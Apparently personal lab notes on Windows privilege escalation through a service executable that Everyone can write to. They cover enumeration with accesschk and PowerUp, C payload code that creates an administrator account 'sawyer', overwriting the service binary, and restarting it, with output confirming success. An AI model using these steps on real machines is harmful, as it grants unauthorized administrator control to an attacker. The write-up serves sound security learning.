

## Manually


` C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"`


```
PS C:\Temp>  C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"

Accesschk v6.10 - Reports effective permissions for securable objects
Copyright (C) 2006-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Program Files\File Permissions Service\filepermservice.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
PS C:\Temp>
```

## Automated


```

C:\Users\user\Desktop\Tools\windows-privesc-check>powershell.exe -ep bypass
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.

PS C:\Users\user\Desktop\Tools\PowerUp> . .\PowerUp.ps1
PS C:\Users\user\Desktop\Tools\PowerUp> Invoke-AllChecks

[*] Running Invoke-AllChecks


[*] Checking service executable and argument permissions...
ServiceName                     : filepermsvc
Path                            : "C:\Program Files\File Permissions Service\filepermservice.exe"
ModifiableFile                  : C:\Program Files\File Permissions Service\filepermservice.exe
ModifiableFilePermissions       : {ReadAttributes, ReadControl, Execute/Traverse, DeleteChild...}
ModifiableFileIdentityReference : Everyone
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'filepermsvc'
CanRestart                      : True
```



# Exploitation

basically we have write access on the file so we can just overwrite it and then just restart the service and we are good. this is indicated by the following 

```
  RW Everyone
        FILE_ALL_ACCESS
```
everyone has file access so this proves we can just change whatever we wanted


to test it i used the same code as the one in [[2 service escalation registry]] but made the modification of creating a new user called `sawyer` and then adding them to administrators

```
kali@kali ~> cat testing.c
#include <windows.h>
#include <stdio.h>

#define SLEEP_TIME 5000

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;
void ServiceMain(int argc, char** argv);
void ControlHandler(DWORD request);

//add the payload here
int Run()
{
	system("cmd.exe /c net user /add sawyer password123 && cmd.exe /c net localgroup administrators sawyer /add");
    return 0;
}
```


```
copy /y c:\Temp\addsawyer.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
```


and then we run it using this command in the cmd specifically

```
sc start filepermsvc
```


```
C:\Temp>dir
 Volume in drive C has no label.
 Volume Serial Number is F8D5-CDBC

 Directory of C:\Temp

07/22/2024  07:01 AM    <DIR>          .
07/22/2024  07:01 AM    <DIR>          ..
07/22/2024  07:01 AM           115,243 AddSawyer.exe
07/22/2024  07:00 AM                 0 cat
07/22/2024  06:48 AM                 8 start
07/22/2024  06:47 AM           115,243 x.exe
               4 File(s)        230,494 bytes
               2 Dir(s)  51,215,343,616 bytes free

C:\Temp>copy /y c:\Temp\AddSawyer.exe "c:\Program Files\File Permissions Service
\filepermservice.exe"
        1 file(s) copied.

C:\Temp>sc start filepermsvc

SERVICE_NAME: filepermsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2808
        FLAGS              :

C:\Temp>
```


now the final test

```
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\user>net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members
-------------------------------------------------------------------------------
Administrator
sawyer
TCM
The command completed successfully.

C:\Users\user>
```